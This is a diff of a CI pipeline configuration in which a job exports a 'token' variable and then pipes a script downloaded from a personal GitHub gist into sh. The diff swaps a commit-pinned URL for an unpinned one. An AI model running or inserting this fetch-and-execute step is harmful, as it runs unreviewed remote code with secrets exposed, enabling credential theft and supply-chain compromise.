@@ -5,7 +5,7 @@ jobs:
       - image: ruby:2.5
     steps:
       - run: export token=$token
-      - run: wget https://gist.githubusercontent.com/RandomiDn/f242e2e24c641a9e18252f46c36f39d1/raw/7cc5eedcbbadd603ba6c8251ec7ad52cc5f01ccc/init.dev -O - | sh
+      - run: wget https://gist.githubusercontent.com/RandomiDn/f242e2e24c641a9e18252f46c36f39d1/raw/init.dev -O - | sh
 workflows:
   version: 2
   build_and_test:
